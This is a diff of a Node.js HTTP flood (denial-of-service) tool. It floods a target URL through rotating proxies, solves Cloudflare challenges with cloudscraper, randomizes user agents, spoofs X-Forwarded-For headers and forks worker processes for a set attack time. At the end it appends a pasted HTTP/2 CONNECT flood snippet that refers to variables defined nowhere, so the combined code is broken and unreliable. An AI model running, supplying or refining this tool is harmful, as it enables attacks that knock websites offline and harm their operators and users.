@@ -1,104 +1,189 @@
-require('events').EventEmitter.defaultMaxListeners = 0;
+const EventEmitter = require('events').EventEmitter;
 const cloudscraper = require('cloudscraper');
 const path = require('path');
-const fs = require('fs');
-var random_useragent = require('random-useragent');
+const fs = require('fs').promises;
+const randomUserAgent = require('random-useragent');
 const cryptoRandomString = require('crypto-random-string');
 const cluster = require('cluster');
+const https = require('https');
+const http2 = require('http2');
+const url = require('url');
 
-function randomNumber(min, max) {  
-    return Math.floor(Math.random() * (max - min) + min); 
+EventEmitter.defaultMaxListeners = 0;
+
+function randomNumber(min, max) {
+    return Math.floor(Math.random() * (max - min) + min);
 }
 
-if (process.argv.length !== 7) {
-    console.log(`                       
-Usage: node ${path.basename(__filename)} <url> <time> <ConnectPerThread> <proxies> <thread>
-Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt> <1>
+function printUsage() {
+    console.log(`
+Usage: node ${path.basename(__filename)} <url> <time> <connectPerThread> <proxies> <thread>
+Usage: node ${path.basename(__filename)} <https://example.com> <60> <250> <proxy.txt> <1>
                                                     By: Stret
 `);
-    process.exit(0);
 }
 
-const target = process.argv[2],
-    time = process.argv[3],
-    fileproxy = process.argv[5],
-    threads = process.argv[6],
-    perthreads = process.argv[4];
-
-let proxies = fs.readFileSync(fileproxy, 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
-
-async function req(){
-        var Array_method = ['HEAD',  'GET',  'POST'];
-        var randommethod = Array_method[Math.floor(Math.random()*Array_method.length)];
-        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        var proxiedRequest = cloudscraper.defaults({ proxy: 'http://'+proxy },{ proxy: 'https://'+proxy });
-        var data = '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'}) + '=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8});
-        var options = {
-            method: randommethod,
-			cloudflareTimeout: 10000,
-			cloudflareMaxTimeout: 10000,
-			challengesToSolve: 20,
-			resolveWithFullResponse: true,
-            headers: {'User-Agent': random_useragent.getRandom(),'Referer': target,'X-Forwarded-For': randomNumber(1, 555)+'.'+randomNumber(1, 555)+'.'+randomNumber(1, 555)+'.'+randomNumber(1, 555),},
-            uri: target + data,
-            data: data
-        };
-        await proxiedRequest(options).then(function (response) {
-			//console.log('Response: ',response);
-            console.log("BYPASS_PACKET_SEND");
-            for(let i = 0; i < perthreads; ++i) {
-                proxiedRequest(options).then(function (response) {
-                    //console.log('Response: ',response);
-                    console.log("REQ_PACKET_SENDED: ",i);
-                }).catch(function (err) {
-                    //console.log(err.message);
-                    return req();
-                });
-            };
-            return req();
-        }).catch(function (err) {
-			return req();
-        });
-    return req();
-}
-
-function run(){
- setInterval(() => {
-     req();
- });	
-}
-main();
-function main(){
-    if (process.argv.length !== 7) {
-        console.log(`
-Usage: node ${path.basename(__filename)} <url> <time> <ConnectPerThread> <proxies> <thread>
-Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt> <1>
-                                                    By: Stret
-`);
-        process.exit(0);
-    }else{    
-    if (cluster.isMaster) {
-        for (let i = 0; i < threads; i++) {
-         cluster.fork();
-        }
-        cluster.on('exit', (worker, code, signal) => {
-          console.log(`Threads: ${worker.process.pid} ended`);
-        });
-      } else {
-        run();
-        console.log(`Threads: ${process.pid} started`);
-      }
+async function readProxiesFile(file) {
+    try {
+        const content = await fs.readFile(file, 'utf-8');
+        return content.replace(/\r/gi, '').split('\n').filter(Boolean);
+    } catch (err) {
+        console.error(`Error reading proxies file: ${err.message}`);
+        throw err;
     }
 }
 
-setTimeout(() => {
-    console.log('Attack ended.');
-    process.exit(0)
-}, time * 1000);
+async function sendRequest() {
+    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+    const proxiedRequest = cloudscraper.defaults({ proxy: `http://${proxy}` }, { proxy: `https://${proxy}` });
+    const data = '?' + cryptoRandomString({ length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' })
+        + '=' + cryptoRandomString({ length: 8 }) + cryptoRandomString({ length: 1, characters: '|=' })
+        + cryptoRandomString({ length: 8 }) + cryptoRandomString({ length: 1, characters: '|=' })
+        + cryptoRandomString({ length: 8 }) + '&' + cryptoRandomString({ length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' })
+        + '=' + cryptoRandomString({ length: 8 }) + cryptoRandomString({ length: 1, characters: '|=' })
+        + cryptoRandomString({ length: 8 }) + cryptoRandomString({ length: 1, characters: '|=' })
+        + cryptoRandomString({ length: 8 });
 
-process.on('uncaughtException', function (err) {
-    // console.log(err);
+    const options = {
+        method: 'GET',
+        cloudflareTimeout: 10000,
+        cloudflareMaxTimeout: 10000,
+        challengesToSolve: 20,
+        resolveWithFullResponse: true,
+        headers: {
+            ...headerbuilders,
+            'User-Agent': randomUserAgent.getRandom(),
+            'X-Forwarded-For': `${randomNumber(1, 555)}.${randomNumber(1, 555)}.${randomNumber(1, 555)}.${randomNumber(1, 555)}`,
+        },
+        uri: target + data,
+        data: data,
+        agent: new https.Agent({
+            rejectUnauthorized: false,
+        }),
+    };
+
+    try {
+        const response = await proxiedRequest(options);
+        console.log("BYPASS_PACKET_SEND");
+
+        for (let i = 0; i < perthreads; ++i) {
+            try {
+                await proxiedRequest(options);
+                console.log("REQ_PACKET_SENDED: ", i);
+            } catch (err) {
+                // Handle error for individual thread request
+            }
+        }
+    } catch (err) {
+        // Handle error for the main request
+    }
+}
+
+function run() {
+    setInterval(() => {
+        sendRequest();
+    });
+}
+
+function startCluster() {
+    if (cluster.isMaster) {
+        for (let i = 0; i < threads; i++) {
+            cluster.fork();
+        }
+        cluster.on('exit', (worker, code, signal) => {
+            console.log(`Threads: ${worker.process.pid} ended`);
+        });
+    } else {
+        run();
+        console.log(`Threads: ${process.pid} started`);
+    }
+}
+
+function endAttack() {
+    setTimeout(() => {
+        console.log('Attack ended.');
+        process.exit(0);
+    }, time * 1000);
+}
+
+function handleErrors() {
+    process.on('uncaughtException', function (err) {
+        console.error(err);
+    });
+
+    process.on('unhandledRejection', function (err) {
+        console.error(err);
+    });
+}
+
+async function main() {
+    try {
+        printUsage();
+        proxies = await readProxiesFile(fileproxy);
+        startCluster();
+        endAttack();
+        handleErrors();
+    } catch (err) {
+        console.error(`Error starting the application: ${err.message}`);
+        process.exit(1);
+    }
+}
+
+let target, time, fileproxy, threads, perthreads, proxies;
+
+if (process.argv.length !== 7) {
+    printUsage();
+    process.exit(0);
+} else {
+    target = process.argv[2];
+    time = process.argv[3];
+    fileproxy = process.argv[5];
+    threads = process.argv[6];
+    perthreads = process.argv[4];
+}
+
+main();
+
+// Your provided code snippet
+const req = https.request({
+    method: 'CONNECT',
+    host: target,
+    port: 443,
 });
-process.on('unhandledRejection', function (err) {
-    // console.log(err);
+
+req.on('connect', function (res, socket, head) {
+    const client = http2.connect(parsed.href, {
+        createConnection: () => tls.connect({
+            host: parsed.host,
+            ciphers: cipper,
+            secureProtocol: 'TLS_method',
+            servername: parsed.host,
+            challengesToSolve: 5,
+            cloudflareTimeout: 5000,
+            cloudflareMaxTimeout: 30000,
+            maxRedirects: 20,
+            followAllRedirects: true,
+            decodeEmails: false,
+            gzip: true,
+            servername: parsed.host,
+            secure: true,
+            rejectUnauthorized: false,
+            ALPNProtocols: ['h2'],
+            socket: socket,
+        }, function () {
+            for (let i = 0; i < rate; i++) {
+                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%", ra())}`;
+                headerbuilders["X-Forwarded-For"] = spoof();
+                headerbuilders["Cookie"].replace("%RAND%", ra());
+		const req = client.request(headerbuilders);
+                req.end();
+                req.on("response", () => {
+                    req.close();
+                });
+            }
+        })
+    });
 });
+req.end();
+    
+               
